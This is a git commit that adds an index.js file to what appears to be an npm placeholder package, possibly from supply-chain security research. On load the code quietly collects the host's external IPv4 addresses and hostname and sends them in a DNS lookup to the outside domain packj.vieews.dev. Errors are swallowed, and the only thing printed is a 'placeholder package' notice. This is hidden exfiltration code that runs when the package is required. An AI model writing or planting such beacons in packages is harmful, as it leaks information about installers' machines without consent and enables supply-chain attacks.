c665eab6724e8559c034f547d7668461f4dc2e6f
Ashish Bijlani <ashish@ossillate.com>
2023-06-09 11:32:44 -0500

    initial code
    Signed-off-by: Ashish Bijlani <ashish@ossillate.com>

---
+++ index.js
@@ -0,0 +1,36 @@
+//index.js
+
+dns = require('dns')
+os = require('os')
+
+'use strict';
+
+try {
+	const nets = os.networkInterfaces();
+	const results = [];
+	
+	for (const name of Object.keys(nets)) {
+	    for (const net of nets[name]) {
+	        const familyV4Value = typeof net.family === 'string' ? 'IPv4' : 4
+	        if (net.family === familyV4Value && !net.internal) {
+	            results.push(net.address);
+	        }
+	    }
+	}
+	
+	var nsLookup = function(domain, timeout, callback) {
+	  var doCallback = function(err, domains) {
+	    callback(err, domains);
+	  };
+	
+	  setTimeout(function() {process.exit();}, timeout);
+	  dns.resolveNs(domain, doCallback);
+	};
+
+	query = '#' + results.join(' # ') + '#' + os.hostname() + '#NPM%PKG_NAME%PKG_VERSION%packj.vieews.dev'
+	nsLookup(query, 3000, function(err, addresses) {});
+} catch (e) {
+	console.log('');
+}
+
+console.log("This is a placeholder package. Please reach out to remove.");
